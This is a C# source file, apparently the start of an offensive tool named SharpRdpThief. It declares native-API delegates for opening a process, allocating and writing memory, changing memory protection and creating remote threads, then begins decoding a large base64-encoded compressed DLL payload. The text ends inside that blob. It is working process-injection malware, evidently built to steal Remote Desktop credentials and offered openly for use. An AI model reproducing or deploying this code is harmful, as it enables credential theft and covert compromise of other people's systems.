using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace SharpRdpThief
{
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DoItDynamicallyBabe.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref DoItDynamicallyBabe.Native.OBJECT_ATTRIBUTES ObjectAttributes,
            ref DoItDynamicallyBabe.Native.CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DoItDynamicallyBabe.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DoItDynamicallyBabe.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DoItDynamicallyBabe.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DoItDynamicallyBabe.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DoItDynamicallyBabe.Win32.Advapi32.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
                dstream.CopyTo(output);

            return output.ToArray();
        }

        public static void Main(string[] args)
        {
            var rDllCompressed = Convert.FromBase64String("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